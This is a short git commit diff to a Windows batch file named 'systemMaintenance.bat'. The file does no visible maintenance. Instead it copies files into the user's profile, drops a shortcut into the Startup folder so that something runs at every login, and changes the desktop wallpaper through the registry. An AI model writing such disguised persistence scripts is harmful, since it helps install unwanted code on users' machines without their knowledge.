4d21d9fd5875c6fc77a1ccc97dcadea9957e29cb
phil <philmorin15@gmail.com>
2020-03-06 12:26:16 -0500

    plz work

--- systemMaintenance.bat
+++ systemMaintenance.bat
@@ -1,5 +1,6 @@
 echo false
 xcopy /s/e/y "%~dp0Install_folders"  "C:\Users\%USERNAME%" 
-xcopy /s/y "%~dp0sys_startup.lnk"  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
+xcopy /s/y "C:\Users\%USERNAME%\System_files\sys_startup.lnk"  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%USERNAME%\System_files\test.bmp /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+timeout 10
